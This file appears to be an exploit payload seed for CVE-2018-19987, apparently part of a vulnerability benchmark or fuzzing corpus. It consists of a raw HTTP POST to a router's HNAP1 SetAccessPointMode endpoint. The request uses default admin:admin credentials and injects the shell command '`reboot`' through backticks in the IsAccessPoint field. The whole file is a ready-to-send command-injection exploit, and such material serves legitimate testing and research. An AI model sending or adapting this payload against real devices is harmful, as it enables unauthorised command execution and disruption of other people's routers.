Vulnerabilities/CVE-2018-19987/BM-2024-00083-payload.seed

POST /HNAP1/ HTTP/1.1
Host: 192.168.33.166:33496
Content-Length: 369
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 1A0C2D9780B15996C77B1EAF5DE94686 1731119352
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.33.166:33496
Referer: http://192.168.33.166:33496/Home.html
Accept-Encoding: gzip, deflate, br
Cookie: Authorization=Basic YWRtaW46YWRtaW4=; UID=admin; PSW=admin; uid=ujcI4DPmyw; PrivateKey=C8B843B87E7C03EF5F224D6D4949A7F1; timeout=83
Connection: keep-alive

<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body><SetAccessPointMode xmlns="http://purenetworks.com/HNAP1/"><IsAccessPoint>'`reboot`'</IsAccessPoint></SetAccessPointMode></soap:Body></soap:Envelope>